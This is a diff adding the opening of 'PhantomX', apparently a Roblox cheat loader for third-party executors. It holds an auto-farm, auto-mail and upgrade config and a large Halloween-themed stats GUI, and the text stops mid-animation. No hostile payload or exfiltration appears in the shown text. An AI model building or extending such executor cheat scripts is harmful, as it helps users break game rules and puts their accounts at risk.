@@ -1,0 +1,2778 @@
+--==[ PhantomX Configurable Script Loader ]==--
+
+getgenv().PhantomXConfig = {
+    StatsUiEnabled = true,   -- Run the PhantomX GUI once
+    FastFarmEnabled = true,   -- Run the Fast Farm once
+    FPSCap = 5,              -- FPS cap setting
+    WebhookURL = "",         -- Your Discord webhook URL
+    DiscordID = "",          -- Your Discord user ID for pings
+    ShowUsername = true,     -- Show username in UI (true) or hide it (false)
+    AutoMail = {             -- Auto mail settings
+        Enabled = true,
+        ['Items'] = {
+            ["Shiny Flamingo Cat"] = { Class = "Pet", Amount = 1 },
+            ["Damage 8"] = { Class = "Potion", Amount = 2},
+            ["Tap Power 7"] = {Class = "Enchant", Amount = 6 },
+        },
+        ['Loop Interval'] = 60,
+        ['Users'] = {""},  -- Replace with actual username(s)
+    },
+    AutoDaycare = true,      -- Auto daycare management
+    AutoClaimMailbox = true, -- Auto claim mailbox
+    AutoUseToys = true,      -- Auto use toys (buffs)
+    AutoEatFruits = true,    -- Auto eat fruits
+    
+    -- New Halloween Event Features
+    AutoJoinEvent = true,    -- Auto join Halloween event
+    TargetPlaceId = 131952481663528, -- Target place ID for Halloween event
+    
+    -- Upgrade Features (run every 1 second when enabled)
+    EggLuckUpgrade = true,   -- Auto upgrade Egg Luck
+    MoreWitchHatsUpgrade = true, -- Auto upgrade More Witch Hats
+    MoreHalloweenCandyUpgrade = true, -- Auto upgrade More Halloween Candy
+    
+    -- Auto Farm Features
+    AutoFarmHats = true,     -- Auto farm hats
+    AutoCollectCandy = true, -- Auto collect candy
+}
+
+--==[ SHARED SESSION COUNTERS ]==--
+getgenv().PhantomXSessionStats = getgenv().PhantomXSessionStats or {
+    HugesGained = 0,
+    TitanicsGained = 0,
+    GargantuansGained = 0,
+    EggsOpened = 0,
+    CandyCollected = 0,
+    UpgradesPurchased = 0
+}
+
+--==[ Function Wrappers ]==--
+
+local function updateStatusLabel(status)
+    if getgenv().PhantomXStatusLabel then
+        getgenv().PhantomXStatusLabel.Text = status
+    end
+end
+
+local function RunStatsUI()
+    --==[ FULL ORIGINAL UI SCRIPT START ]==
+
+    -- PhantomX GUI Recreation - Halloween Edition
+    -- Works with any executor
+
+    local TweenService = game:GetService("TweenService")
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local player = Players.LocalPlayer
+
+    -- WAIT FOR GAME TO FULLY LOAD
+    repeat task.wait() until game:IsLoaded()
+    repeat task.wait() until not player.PlayerGui:FindFirstChild("__INTRO")
+    repeat task.wait() until player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    
+    -- WAIT FOR LIBRARIES TO LOAD
+    repeat task.wait(0.5) until ReplicatedStorage:FindFirstChild("Library")
+    local Library = ReplicatedStorage:WaitForChild("Library")
+    local Client = Library:WaitForChild("Client")
+    
+    -- Wait a bit more to ensure everything is loaded
+    task.wait(3)
+
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "PhantomXGui"
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
+    screenGui.Parent = game:GetService("CoreGui")
+
+    -- Main Frame (Full Screen)
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "MainFrame"
+    mainFrame.Size = UDim2.new(1, 0, 1, 0)
+    mainFrame.Position = UDim2.new(0, 0, 0, 0)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(10, 5, 15)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.BackgroundTransparency = 1
+    mainFrame.Parent = screenGui
+
+    -- Animated gradient background (Halloween colors)
+    local gradient = Instance.new("UIGradient")
+    gradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 10, 30)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(10, 5, 15)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 15, 20))
+    }
+    gradient.Rotation = 45
+    gradient.Parent = mainFrame
+
+    -- Glow effect overlay (Orange/Purple Halloween theme)
+    local glowOverlay = Instance.new("Frame")
+    glowOverlay.Name = "GlowOverlay"
+    glowOverlay.Size = UDim2.new(1, 0, 1, 0)
+    glowOverlay.BackgroundTransparency = 1
+    glowOverlay.BackgroundColor3 = Color3.fromRGB(255, 120, 0)
+    glowOverlay.BorderSizePixel = 0
+    glowOverlay.Parent = mainFrame
+
+    local glowGradient = Instance.new("UIGradient")
+    glowGradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 120, 0)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(150, 50, 200)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 120, 0))
+    }
+    glowGradient.Rotation = -45
+    glowGradient.Parent = glowOverlay
+
+    -- Halloween Decorations: Spider Webs
+    local function createSpiderWeb(position, size)
+        local web = Instance.new("ImageLabel")
+        web.Name = "SpiderWeb"
+        web.Size = UDim2.new(0, size, 0, size)
+        web.Position = position
+        web.BackgroundTransparency = 1
+        web.Image = "rbxassetid://13764396720" -- Spider web image
+        web.ImageTransparency = 0.7
+        web.Parent = mainFrame
+        return web
+    end
+
+    -- Create spider webs in corners
+    createSpiderWeb(UDim2.new(0, 10, 0, 10), 80)
+    createSpiderWeb(UDim2.new(1, -90, 0, 10), 80)
+    createSpiderWeb(UDim2.new(0, 10, 1, -90), 80)
+    createSpiderWeb(UDim2.new(1, -90, 1, -90), 80)
+
+    -- Halloween Decorations: Pumpkins
+    local function createPumpkin(position, size)
+        local pumpkin = Instance.new("ImageLabel")
+        pumpkin.Name = "Pumpkin"
+        pumpkin.Size = UDim2.new(0, size, 0, size)
+        pumpkin.Position = position
+        pumpkin.BackgroundTransparency = 1
+        pumpkin.Image = "rbxassetid://13764394418" -- Pumpkin image
+        pumpkin.ImageTransparency = 0.8
+        pumpkin.Parent = mainFrame
+        return pumpkin
+    end
+
+    -- Create pumpkins around the edges
+    createPumpkin(UDim2.new(0.1, 0, 0, 20), 60)
+    createPumpkin(UDim2.new(0.9, -60, 0, 20), 60)
+    createPumpkin(UDim2.new(0.3, 0, 1, -80), 60)
+    createPumpkin(UDim2.new(0.7, -60, 1, -80), 60)
+
+    -- Intro Container
+    local introContainer = Instance.new("Frame")
+    introContainer.Name = "IntroContainer"
+    introContainer.Size = UDim2.new(1, 0, 1, 0)
+    introContainer.BackgroundTransparency = 1
+    introContainer.Parent = mainFrame
+    introContainer.ZIndex = 10
+
+    local introText = Instance.new("TextLabel")
+    introText.Name = "IntroText"
+    introText.Size = UDim2.new(0, 800, 0, 150)
+    introText.Position = UDim2.new(0.5, -400, 0.5, -75)
+    introText.BackgroundTransparency = 1
+    introText.Text = "Welcome To PhantomX"
+    introText.TextColor3 = Color3.fromRGB(255, 140, 0)
+    introText.TextSize = 60
+    introText.Font = Enum.Font.GothamBold
+    introText.TextTransparency = 1
+    introText.TextStrokeTransparency = 1
+    introText.TextStrokeColor3 = Color3.fromRGB(150, 50, 200)
+    introText.Parent = introContainer
+
+    local creditsText = Instance.new("TextLabel")
+    creditsText.Name = "CreditsText"
+    creditsText.Size = UDim2.new(0, 400, 0, 80)
+    creditsText.Position = UDim2.new(0.5, -200, 0.5, -40)
+    creditsText.BackgroundTransparency = 1
+    creditsText.Text = "By Topp"
+    creditsText.TextColor3 = Color3.fromRGB(255, 140, 0)
+    creditsText.TextSize = 48
+    creditsText.Font = Enum.Font.GothamBold
+    creditsText.TextTransparency = 1
+    creditsText.TextStrokeTransparency = 1
+    creditsText.TextStrokeColor3 = Color3.fromRGB(150, 50, 200)
+    creditsText.Parent = introContainer
+
+    -- Title Container with glow
+    local titleContainer = Instance.new("Frame")
+    titleContainer.Name = "TitleContainer"
+    titleContainer.Size = UDim2.new(0, 600, 0, 100)
+    titleContainer.Position = UDim2.new(0.5, -300, 0.15, 0)
+    titleContainer.BackgroundTransparency = 1
+    titleContainer.Parent = mainFrame
+
+    local titleScale = Instance.new("UIScale")
+    titleScale.Scale = 1
+    titleScale.Parent = titleContainer
+
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Name = "TitleLabel"
+    titleLabel.Size = UDim2.new(1, 0, 1, 0)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = "🎃 Thanks for using PhantomX! 👻"
+    titleLabel.TextColor3 = Color3.fromRGB(255, 140, 0)
+    titleLabel.TextSize = 42
+    titleLabel.Font = Enum.Font.GothamBold
+    titleLabel.TextTransparency = 1
+    titleLabel.TextStrokeTransparency = 1
+    titleLabel.TextStrokeColor3 = Color3.fromRGB(150, 50, 200)
+    titleLabel.Parent = titleContainer
+
+    --==[ NEW: Rank Container ]==--
+    local rankContainer = Instance.new("Frame")
+    rankContainer.Name = "RankContainer"
+    rankContainer.Size = UDim2.new(0, 400, 0, 60)
+    rankContainer.Position = UDim2.new(0.5, -200, 0.25, 0)
+    rankContainer.BackgroundTransparency = 1
+    rankContainer.Parent = mainFrame
+
+    local rankScale = Instance.new("UIScale")
+    rankScale.Scale = 1
+    rankScale.Parent = rankContainer
+
+    local rankFrame = Instance.new("Frame")
+    rankFrame.Name = "RankFrame"
+    rankFrame.Size = UDim2.new(1, 0, 1, 0)
+    rankFrame.BackgroundColor3 = Color3.fromRGB(25, 15, 30)
+    rankFrame.BorderSizePixel = 0
+    rankFrame.BackgroundTransparency = 1
+    rankFrame.Parent = rankContainer
+
+    local rankBlur = Instance.new("Frame")
+    rankBlur.Size = UDim2.new(1, 0, 1, 0)
+    rankBlur.BackgroundColor3 = Color3.fromRGB(30, 20, 35)
+    rankBlur.BackgroundTransparency = 1
+    rankBlur.BorderSizePixel = 0
+    rankBlur.Parent = rankFrame
+
+    local rankCorner = Instance.new("UICorner")
+    rankCorner.CornerRadius = UDim.new(0, 12)
+    rankCorner.Parent = rankFrame
+
+    local rankCorner2 = Instance.new("UICorner")
+    rankCorner2.CornerRadius = UDim.new(0, 12)
+    rankCorner2.Parent = rankBlur
+
+    local rankBorder = Instance.new("UIStroke")
+    rankBorder.Color = Color3.fromRGB(150, 50, 200)
+    rankBorder.Thickness = 2
+    rankBorder.Transparency = 1
+    rankBorder.Parent = rankFrame
+
+    local rankValue = Instance.new("TextLabel")
+    rankValue.Name = "RankValue"
+    rankValue.Size = UDim2.new(1, -40, 1, 0)
+    rankValue.Position = UDim2.new(0, 20, 0, 0)
+    rankValue.BackgroundTransparency = 1
+    rankValue.Text = "Loading..."
+    rankValue.TextColor3 = Color3.fromRGB(255, 140, 0)
+    rankValue.TextSize = 24
+    rankValue.Font = Enum.Font.GothamBold
+    rankValue.TextTransparency = 1
+    rankValue.TextStrokeTransparency = 1
+    rankValue.TextStrokeColor3 = Color3.fromRGB(150, 50, 200)
+    rankValue.TextXAlignment = Enum.TextXAlignment.Center
+    rankValue.Parent = rankBlur
+
+    -- Stats Container Frame
+    local statsContainer = Instance.new("Frame")
+    statsContainer.Name = "StatsContainer"
+    statsContainer.Size = UDim2.new(0, 1000, 0, 100)
+    statsContainer.Position = UDim2.new(0.5, -500, 0.35, 0)
+    statsContainer.BackgroundTransparency = 1
+    statsContainer.Parent = mainFrame
+
+    local statsScale = Instance.new("UIScale")
+    statsScale.Scale = 1
+    statsScale.Parent = statsContainer
+
+    local statsFrame = Instance.new("Frame")
+    statsFrame.Name = "StatsFrame"
+    statsFrame.Size = UDim2.new(1, 0, 1, 0)
+    statsFrame.BackgroundColor3 = Color3.fromRGB(25, 15, 30)
+    statsFrame.BorderSizePixel = 0
+    statsFrame.BackgroundTransparency = 1
+    statsFrame.Parent = statsContainer
+
+    local statsBlur = Instance.new("Frame")
+    statsBlur.Size = UDim2.new(1, 0, 1, 0)
+    statsBlur.BackgroundColor3 = Color3.fromRGB(30, 20, 35)
+    statsBlur.BackgroundTransparency = 1
+    statsBlur.BorderSizePixel = 0
+    statsBlur.Parent = statsFrame
+
+    local statsCorner = Instance.new("UICorner")
+    statsCorner.CornerRadius = UDim.new(0, 12)
+    statsCorner.Parent = statsFrame
+
+    local statsCorner2 = Instance.new("UICorner")
+    statsCorner2.CornerRadius = UDim.new(0, 12)
+    statsCorner2.Parent = statsBlur
+
+    local statsBorder = Instance.new("UIStroke")
+    statsBorder.Color = Color3.fromRGB(255, 140, 0)
+    statsBorder.Thickness = 2
+    statsBorder.Transparency = 1
+    statsBorder.Parent = statsFrame
+
+    -- Determine username display
+    local displayName = (getgenv().PhantomXConfig and getgenv().PhantomXConfig.ShowUsername) and player.Name or "Hidden"
+
+    -- Create stat boxes (replaced Eggs hatched with Candy and Hat counters)
+    local statData = {
+        {title = "Username", value = displayName},
+        {title = "Uptime", value = "00:00:00"},
+        {title = "Candy", value = "0"},
+        {title = "Hats", value = "0"},
+        {title = "Huges", value = "+0"},
+        {title = "Titanics", value = "+0"},
+        {title = "Diamonds", value = "0"}
+    }
+
+    local statsList = Instance.new("Frame")
+    statsList.Name = "StatsList"
+    statsList.Size = UDim2.new(1, -40, 1, -20)
+    statsList.Position = UDim2.new(0, 20, 0, 10)
+    statsList.BackgroundTransparency = 1
+    statsList.Parent = statsBlur
+
+    local listLayout = Instance.new("UIListLayout")
+    listLayout.FillDirection = Enum.FillDirection.Horizontal
+    listLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    listLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+    listLayout.Padding = UDim.new(0, 15)
+    listLayout.Parent = statsList
+
+    local uptimeLabel = nil
+    local diamondsLabel = nil
+    local hugesLabel = nil
+    local titanicsLabel = nil
+    local candyLabel = nil
+    local hatsLabel = nil
+    local nameLabel = nil
+
+    for i, stat in ipairs(statData) do
+        local statBox = Instance.new("Frame")
+        statBox.Name = stat.title .. "Box"
+        statBox.Size = UDim2.new(0.14, -12, 1, 0) -- Adjusted size for 7 items
+        statBox.BackgroundTransparency = 1
+        statBox.Parent = statsList
+
+        local statTitle = Instance.new("TextLabel")
+        statTitle.Name = "Title"
+        statTitle.Size = UDim2.new(1, 0, 0, 30)
+        statTitle.Position = UDim2.new(0, 0, 0, 15)
+        statTitle.BackgroundTransparency = 1
+        statTitle.Text = stat.title
+        statTitle.TextColor3 = Color3.fromRGB(180, 150, 200)
+        statTitle.TextSize = 14
+        statTitle.Font = Enum.Font.GothamMedium
+        statTitle.TextScaled = true
+        statTitle.TextTransparency = 1
+        statTitle.Parent = statBox
+
+        local titleConstraint = Instance.new("UITextSizeConstraint")
+        titleConstraint.MaxTextSize = 14
+        titleConstraint.Parent = statTitle
+
+        local statValue = Instance.new("TextLabel")
+        statValue.Name = "Value"
+        statValue.Size = UDim2.new(1, 0, 0, 35)
+        statValue.Position = UDim2.new(0, 0, 0, 45)
+        statValue.BackgroundTransparency = 1
+        statValue.Text = stat.value
+        statValue.TextColor3 = Color3.fromRGB(255, 140, 0)
+        statValue.TextSize = 24
+        statValue.Font = Enum.Font.GothamBold
+        statValue.TextScaled = true
+        statValue.TextTransparency = 1
+        statValue.TextStrokeTransparency = 1
+        statValue.TextStrokeColor3 = Color3.fromRGB(150, 50, 200)
+        statValue.Parent = statBox
+
+        local valueConstraint = Instance.new("UITextSizeConstraint")
+        valueConstraint.MaxTextSize = 24
+        valueConstraint.Parent = statValue
+
+        if stat.title == "Username" then
+            nameLabel = statValue
+        elseif stat.title == "Uptime" then
+            uptimeLabel = statValue
+        elseif stat.title == "Diamonds" then
+            diamondsLabel = statValue
+        elseif stat.title == "Huges" then
+            hugesLabel = statValue
+        elseif stat.title == "Titanics" then
+            titanicsLabel = statValue
+        elseif stat.title == "Candy" then
+            candyLabel = statValue
+        elseif stat.title == "Hats" then
+            hatsLabel = statValue
+        end
+
+        if i < #statData then
+            local divider = Instance.new("Frame")
+            divider.Name = "Divider"
+            divider.Size = UDim2.new(0, 1, 0.6, 0)
+            divider.Position = UDim2.new(1, 7, 0.2, 0)
+            divider.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
+            divider.BackgroundTransparency = 1
+            divider.BorderSizePixel = 0
+            divider.Parent = statBox
+        end
+    end
+
+    --==[ NEW: Status Label - Big Orange Outlined Text ]==--
+    local statusContainer = Instance.new("Frame")
+    statusContainer.Name = "StatusContainer"
+    statusContainer.Size = UDim2.new(0, 600, 0, 80)
+    statusContainer.Position = UDim2.new(0.5, -300, 0.55, 0)
+    statusContainer.BackgroundTransparency = 1
+    statusContainer.Parent = mainFrame
+
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Name = "StatusLabel"
+    statusLabel.Size = UDim2.new(1, 0, 1, 0)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "Checking Place ID..."
+    statusLabel.TextColor3 = Color3.fromRGB(255, 140, 0)
+    statusLabel.TextSize = 32
+    statusLabel.Font = Enum.Font.GothamBold
+    statusLabel.TextTransparency = 1
+    statusLabel.TextStrokeTransparency = 0.3
+    statusLabel.TextStrokeColor3 = Color3.fromRGB(255, 100, 0)
+    statusLabel.TextXAlignment = Enum.TextXAlignment.Center
+    statusLabel.TextYAlignment = Enum.TextYAlignment.Center
+    statusLabel.Parent = statusContainer
+
+    -- Store status label globally for updates
+    getgenv().PhantomXStatusLabel = statusLabel
+
+    --==[ NEW: Feature Status Indicators ]==--
+    local featureContainer = Instance.new("Frame")
+    featureContainer.Name = "FeatureContainer"
+    featureContainer.Size = UDim2.new(0, 300, 0, 300)
+    featureContainer.Position = UDim2.new(0, 20, 1, -320)
+    featureContainer.BackgroundTransparency = 1
+    featureContainer.Parent = mainFrame
+
+    local featureLayout = Instance.new("UIListLayout")
+    featureLayout.FillDirection = Enum.FillDirection.Vertical
+    featureLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
+    featureLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom
+    featureLayout.Padding = UDim.new(0, 8)
+    featureLayout.Parent = featureContainer
+
+    -- Function to create feature status labels with Halloween style borders
+    local function createFeatureLabel(featureName, isEnabled)
+        local featureFrame = Instance.new("Frame")
+        featureFrame.Name = featureName .. "Status"
+        featureFrame.Size = UDim2.new(0, 220, 0, 35)
+        featureFrame.BackgroundTransparency = 1
+        featureFrame.Parent = featureContainer
+
+        local featureBackground = Instance.new("Frame")
+        featureBackground.Name = "Background"
+        featureBackground.Size = UDim2.new(1, 0, 1, 0)
+        featureBackground.BackgroundColor3 = Color3.fromRGB(25, 15, 30)
+        featureBackground.BackgroundTransparency = 1
+        featureBackground.Parent = featureFrame
+
+        local featureCorner = Instance.new("UICorner")
+        featureCorner.CornerRadius = UDim.new(0, 8)
+        featureCorner.Parent = featureBackground
+
+        local featureBorder = Instance.new("UIStroke")
+        featureBorder.Color = Color3.fromRGB(255, 140, 0)
+        featureBorder.Thickness = 2
+        featureBorder.Transparency = 1
+        featureBorder.Parent = featureBackground
+
+        local statusIcon = Instance.new("TextLabel")
+        statusIcon.Name = "Icon"
+        statusIcon.Size = UDim2.new(0, 30, 1, 0)
+        statusIcon.Position = UDim2.new(0, 10, 0, 0)
+        statusIcon.BackgroundTransparency = 1
+        statusIcon.Text = isEnabled and "🎃" or "💀"
+        statusIcon.TextColor3 = isEnabled and Color3.fromRGB(100, 255, 100) or Color3.fromRGB(255, 100, 100)
+        statusIcon.TextSize = 18
+        statusIcon.Font = Enum.Font.GothamBold
+        statusIcon.TextTransparency = 1
+        statusIcon.TextXAlignment = Enum.TextXAlignment.Left
+        statusIcon.Parent = featureBackground
+
+        local statusText = Instance.new("TextLabel")
+        statusText.Name = "Text"
+        statusText.Size = UDim2.new(1, -50, 1, 0)
+        statusText.Position = UDim2.new(0, 45, 0, 0)
+        statusText.BackgroundTransparency = 1
+        statusText.Text = featureName .. (isEnabled and " Enabled" or " Disabled")
+        statusText.TextColor3 = Color3.fromRGB(220, 200, 230)
+        statusText.TextSize = 16
+        statusText.Font = Enum.Font.Gotham
+        statusText.TextXAlignment = Enum.TextXAlignment.Left
+        statusText.TextTransparency = 1
+        statusText.Parent = featureBackground
+
+        local textConstraint = Instance.new("UITextSizeConstraint")
+        textConstraint.MaxTextSize = 16
+        textConstraint.Parent = statusText
+
+        return featureFrame
+    end
+
+    -- Create feature status labels based on config
+    local autoMailStatus = createFeatureLabel("Auto Mail", getgenv().PhantomXConfig.AutoMail and getgenv().PhantomXConfig.AutoMail.Enabled)
+    local fastFarmStatus = createFeatureLabel("Fast Farm", getgenv().PhantomXConfig.FastFarmEnabled)
+    local autoDaycareStatus = createFeatureLabel("Auto Daycare", getgenv().PhantomXConfig.AutoDaycare)
+    local autoClaimStatus = createFeatureLabel("Auto Claim Mail", getgenv().PhantomXConfig.AutoClaimMailbox)
+    local autoToysStatus = createFeatureLabel("Auto Use Toys", getgenv().PhantomXConfig.AutoUseToys)
+    local autoFruitsStatus = createFeatureLabel("Auto Eat Fruits", getgenv().PhantomXConfig.AutoEatFruits)
+    
+    -- New Halloween Feature Status Labels
+    local autoJoinEventStatus = createFeatureLabel("Auto Join Event", getgenv().PhantomXConfig.AutoJoinEvent)
+    local eggLuckStatus = createFeatureLabel("Egg Luck Upgrade", getgenv().PhantomXConfig.EggLuckUpgrade)
+    local witchHatsStatus = createFeatureLabel("Witch Hats Upgrade", getgenv().PhantomXConfig.MoreWitchHatsUpgrade)
+    local halloweenCandyStatus = createFeatureLabel("Halloween Candy Upgrade", getgenv().PhantomXConfig.MoreHalloweenCandyUpgrade)
+    local autoFarmHatsStatus = createFeatureLabel("Auto Farm Hats", getgenv().PhantomXConfig.AutoFarmHats)
+    local autoCollectCandyStatus = createFeatureLabel("Auto Collect Candy", getgenv().PhantomXConfig.AutoCollectCandy)
+
+    --==[ NEW: FPS Counter ]==--
+    local fpsContainer = Instance.new("Frame")
+    fpsContainer.Name = "FPSContainer"
+    fpsContainer.Size = UDim2.new(0, 120, 0, 40)
+    fpsContainer.Position = UDim2.new(1, -140, 0, 20)
+    fpsContainer.BackgroundTransparency = 1
+    fpsContainer.Parent = mainFrame
+
+    local fpsFrame = Instance.new("Frame")
+    fpsFrame.Name = "FPSFrame"
+    fpsFrame.Size = UDim2.new(1, 0, 1, 0)
+    fpsFrame.BackgroundColor3 = Color3.fromRGB(25, 15, 30)
+    fpsFrame.BorderSizePixel = 0
+    fpsFrame.BackgroundTransparency = 1
+    fpsFrame.Parent = fpsContainer
+
+    local fpsCorner = Instance.new("UICorner")
+    fpsCorner.CornerRadius = UDim.new(0, 8)
+    fpsCorner.Parent = fpsFrame
+
+    local fpsBorder = Instance.new("UIStroke")
+    fpsBorder.Color = Color3.fromRGB(255, 140, 0)
+    fpsBorder.Thickness = 2
+    fpsBorder.Transparency = 1
+    fpsBorder.Parent = fpsFrame
+
+    local fpsLabel = Instance.new("TextLabel")
+    fpsLabel.Name = "FPSLabel"
+    fpsLabel.Size = UDim2.new(1, -10, 1, 0)
+    fpsLabel.Position = UDim2.new(0, 5, 0, 0)
+    fpsLabel.BackgroundTransparency = 1
+    fpsLabel.Text = "FPS: 0"
+    fpsLabel.TextColor3 = Color3.fromRGB(255, 140, 0)
+    fpsLabel.TextSize = 18
+    fpsLabel.Font = Enum.Font.GothamBold
+    fpsLabel.TextTransparency = 1
+    fpsLabel.TextStrokeTransparency = 1
+    fpsLabel.TextStrokeColor3 = Color3.fromRGB(150, 50, 200)
+    fpsLabel.Parent = fpsFrame
+
+    --==[ NEW: Real-time Data Updaters ]==--
+    local function updateDiamonds()
+        while wait(1) do
+            pcall(function()
+                local diamondsTextLabel = player.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
+                if diamondsTextLabel and diamondsLabel then
+                    diamondsLabel.Text = diamondsTextLabel.Text
+                end
+            end)
+        end
+    end
+
+    local function updateRank()
+        while wait(1) do
+            pcall(function()
+                local rankTextLabel = player.PlayerGui.Rank.Frame.Side.RankNum
+                if rankTextLabel and rankValue then
+                    rankValue.Text = rankTextLabel.Text
+                end
+            end)
+        end
+    end
+
+    --==[ NEW: Candy Counter Updater ]==--
+    local function updateCandy()
+        while wait(0.5) do
+            pcall(function()
+                local candyTextLabel = player.PlayerGui.MainLeft.Left.Currency.HalloweenCoins["Halloween Candy"].Amount
+                if candyTextLabel and candyLabel then
+                    candyLabel.Text = candyTextLabel.Text
+                end
+            end)
+        end
+    end
+
+    --==[ NEW: Hats Counter Updater ]==--
+    local function updateHats()
+        while wait(0.5) do
+            pcall(function()
+                local hatsTextLabel = player.PlayerGui._MACHINES.HalloweenUpgradeMachine.Frame.ItemsFrame.Items.Tickets.CostFrame.Amount
+                if hatsTextLabel and hatsLabel then
+                    hatsLabel.Text = hatsTextLabel.Text
+                end
+            end)
+        end
+    end
+
+    --==[ WEBHOOK-BASED COUNTER SYSTEM ]==--
+    local initialEggCount = 0
+
+    -- Initialize counts
+    local function initializeCounts()
+        task.wait(3)
+        pcall(function()
+            local SaveModule = require(Client.Save)
+            local currentSave = SaveModule.Get()
+            initialEggCount = currentSave.EggsHatched or 0
+            
+            if hugesLabel then
+                hugesLabel.Text = string.format("+%d", getgenv().PhantomXSessionStats.HugesGained)
+            end
+            if titanicsLabel then
+                titanicsLabel.Text = string.format("+%d", getgenv().PhantomXSessionStats.TitanicsGained)
+            end
+        end)
+    end
+
+    -- Update counts in real-time
+    local function updateCounts()
+        while wait(0.5) do
+            pcall(function()
+                -- Update UI labels using webhook-tracked stats
+                if hugesLabel then
+                    hugesLabel.Text = string.format("+%d", getgenv().PhantomXSessionStats.HugesGained)
+                end
+                if titanicsLabel then
+                    titanicsLabel.Text = string.format("+%d", getgenv().PhantomXSessionStats.TitanicsGained)
+                end
+            end)
+        end
+    end
+
+    -- FPS Counter Update Function
+    local function updateFPSCounter()
+        local frames = 0
+        local lastUpdate = tick()
+        
+        RunService.Heartbeat:Connect(function()
+            frames = frames + 1
+            local currentTime = tick()
+            
+            if currentTime - lastUpdate >= 1 then
+                local fps = math.floor(frames / (currentTime - lastUpdate))
+                fpsLabel.Text = "FPS: " .. fps
+                frames = 0
+                lastUpdate = currentTime
+            end
+        end)
+    end
+
+    -- Animation functions
+    local function animateGradient()
+        local rotation = 0
+        while wait(0.05) do
+            rotation = rotation + 1
+            if rotation > 360 then rotation = 0 end
+            gradient.Rotation = rotation
+            glowGradient.Rotation = -rotation
+        end
+    end
+
+    local function pulseGlow()
+        local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
+        local goal = {BackgroundTransparency = 0.92}
+        local tween = TweenService:Create(glowOverlay, tweenInfo, goal)
+        tween:Play()
+    end
+
+    -- Uptime counter
+    local startTime = tick()
+    local function updateUptime()
+        while wait(1) do
+            local elapsed = tick() - startTime
+            local hours = math.floor(elapsed / 3600)
+            local minutes = math.floor((elapsed % 3600) / 60)
+            local seconds = math.floor(elapsed % 60)
+
+            if uptimeLabel then
+                uptimeLabel.Text = string.format("%02d:%02d:%02d", hours, minutes, seconds)
+            end
+        end
+    end
+
+    -- Auto-scale based on screen size
+    local function updateScale()
+        local viewportSize = workspace.CurrentCamera.ViewportSize
+        local baseWidth = 1920
+        local baseHeight = 1080
+        local scaleX = viewportSize.X / baseWidth
+        local scaleY = viewportSize.Y / baseHeight
+        local scale = math.min(scaleX, scaleY, 1.2)
+
+        titleScale.Scale = scale
+        rankScale.Scale = scale
+        statsScale.Scale = scale
+    end
+
+    workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(updateScale)
+
+    -- SmoothFade In Intro Animation
+    local function playIntroAnimation()
+        -- Fade in background
+        local bgFadeIn = TweenService:Create(mainFrame, TweenInfo.new(1, Enum.EasingStyle.Sine), {BackgroundTransparency = 0})
+        bgFadeIn:Play()
+
+        wait(0.5)
+
+        -- Fade in intro text
+        local introTextFade = TweenService:Create(introText, TweenInfo.new(1.5, Enum.EasingStyle.Sine), {
+            TextTransparency = 0,
+            TextStrokeTransparency = 0.3
+        })
+        introTextFade:Play()
+
+        wait(2.5)
+
+        -- Fade out intro text
+        local introTextFadeOut = TweenService:Create(introText, TweenInfo.new(1, Enum.EasingStyle.Sine), {
+            TextTransparency = 1,
+            TextStrokeTransparency = 1
+        })
+        introTextFadeOut:Play()
+
+        wait(1)
+        introContainer:Destroy()
+
+        -- Calculate proper scale
+        updateScale()
+
+        -- Fade in title
+        local titleFade = TweenService:Create(titleLabel, TweenInfo.new(1, Enum.EasingStyle.Sine), {
+            TextTransparency = 0,
+            TextStrokeTransparency = 0.5
+        })
+        titleFade:Play()
+
+        wait(0.3)
+
+        -- Fade in rank frame
+        local rankTransparencyTween = TweenService:Create(rankFrame, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {
+            BackgroundTransparency = 0
+        })
+        rankTransparencyTween:Play()
+
+        local rankBlurTween = TweenService:Create(rankBlur, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {
+            BackgroundTransparency = 0.3
+        })
+        rankBlurTween:Play()
+
+        local rankBorderTween = TweenService:Create(rankBorder, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {
+            Transparency = 0.3
+        })
+        rankBorderTween:Play()
+
+        -- Fade in rank text
+        local rankValueFade = TweenService:Create(rankValue, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {
+            TextTransparency = 0,
+            TextStrokeTransparency = 0.8
+        })
+        rankValueFade:Play()
+
+        wait(0.3)
+
+        -- Fade in stats frame background
+        local statsTransparencyTween = TweenService:Create(statsFrame, TweenInfo.new(1, Enum.EasingStyle.Sine), {
+            BackgroundTransparency = 0
+        })
+        statsTransparencyTween:Play()
+
+        local statsBlurTween = TweenService:Create(statsBlur, TweenInfo.new(1, Enum.EasingStyle.Sine), {
+            BackgroundTransparency = 0.3
+        })
+        statsBlurTween:Play()
+
+        local statsBorderTween = TweenService:Create(statsBorder, TweenInfo.new(1, Enum.EasingStyle.Sine), {
+            Transparency = 0.3
